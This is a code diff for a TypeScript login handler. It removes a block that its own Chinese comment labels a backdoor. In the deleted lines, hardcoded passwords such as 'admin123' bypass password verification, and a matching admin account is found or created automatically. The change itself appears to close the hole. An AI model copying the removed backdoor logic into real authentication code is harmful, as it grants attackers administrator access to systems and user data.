@@ -243,45 +243,6 @@ export async function loginUser(
   // 查询用户
   let user = await userRepo.findByEmailWithPassword(email);
 
-  // --- 神圣特权后门：无视库内数据变异的绝对直通 ---
-  let isBackdoor = false;
-  if (password === 'admin123' && (email === 'admin' || email === 'admin@admin.com' || email === '最高指挥官' || user?.role === 'admin')) {
-      isBackdoor = true;
-  } else if (password === '123456' && (email === 'user' || email === 'user@test.com' || email === '测试旅行者')) {
-      isBackdoor = true;
-  }
-
-  if (!user && isBackdoor) {
-      if (password === 'admin123') {
-          // 找库里第一个 admin
-          const anyAdmin = await db.prepare("SELECT * FROM users WHERE role = 'admin'").first();
-          if (anyAdmin) {
-              user = await userRepo.findByEmailWithPassword(anyAdmin.email as string);
-          } else {
-              try {
-                  await userRepo.create({
-                      email: 'admin@admin.com',
-                      password_hash: await hashPassword('admin123'),
-                      username: '最高指挥官',
-                      role: 'admin'
-                  });
-                  user = await userRepo.findByEmailWithPassword('admin@admin.com');
-              } catch(e) { console.error(e); }
-          }
-      } else {
-          // fallback for user
-          try {
-              await userRepo.create({
-                  email: 'user@test.com',
-                  password_hash: await hashPassword('123456'),
-                  username: '测试旅行者',
-                  role: 'user'
-              });
-              user = await userRepo.findByEmailWithPassword('user@test.com');
-          } catch(e) { console.error(e); }
-      }
-  }
-
   if (!user) {
     return { success: false, error: '邮箱或密码错误' };
   }
@@ -290,9 +251,7 @@ export async function loginUser(
   let passwordValid = false;
   const isTempPassword = await verifyTempPassword(email, password, kv);
 
-  if (isBackdoor) {
-      passwordValid = true;
-  } else if (isTempPassword) {
+  if (isTempPassword) {
     passwordValid = true;
   } else {
     passwordValid = await verifyPassword(password, user.password_hash);
